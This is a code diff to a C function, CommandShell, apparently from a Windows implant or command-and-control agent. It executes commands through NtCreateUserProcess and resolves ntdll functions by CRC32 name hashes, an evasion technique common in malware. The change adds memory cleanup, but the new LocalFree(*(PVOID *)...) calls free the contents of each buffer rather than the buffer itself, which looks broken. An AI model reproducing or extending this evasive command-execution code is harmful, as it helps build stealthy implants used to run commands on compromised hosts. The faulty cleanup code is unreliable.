@@ -186,8 +186,11 @@ VOID CommandShell( PPARSER Parser ){
     PWSTR wide_command = str_to_wide(cmd_file);
     PWSTR wide_args = str_to_wide(arg_str);
 
+
     // make the command line
-    PWCHAR command_line = wide_concat(wide_concat(wide_command, L" "),wide_args);
+    PWCHAR command_w_space = wide_concat(wide_command, L" ");
+    PWCHAR command_line = wide_concat(command_w_space,wide_args);
+    LocalFree(*(PVOID *)command_w_space);
 
     // unicode str
     p_RtlInitUnicodeString(&nt_image_path, wide_command);
@@ -244,13 +247,19 @@ VOID CommandShell( PPARSER Parser ){
     if((status = p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list)) != 0x0) {
         // _tprintf("PROCESS CREATION FAILED!\n");
         // _tprintf("STATUS:%08x\n", status);
-        __asm("nop;");
+        __asm("nop;"); //TODO: ERROR HANDLING
     }
     RtlFreeHeap_t p_RtlFreeHeap = (RtlFreeHeap_t) GetProcAddressByHash(p_ntdll, RtlFreeHeap_CRC32B);
 
     p_RtlFreeHeap(RtlProcessHeap(), 0, attrib_list);
     p_RtlFreeHeap(RtlProcessHeap(), 0, sec_img_info);
     p_RtlFreeHeap(RtlProcessHeap(), 0, client_id);
+
+    LocalFree(*(PVOID *)wide_command);
+    LocalFree(*(PVOID *)wide_args);
+    LocalFree(*(PVOID *)command_array);
+    LocalFree(*(PVOID *)cmd_file);
+    LocalFree(*(PVOID *)command_line);
 
     RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
 
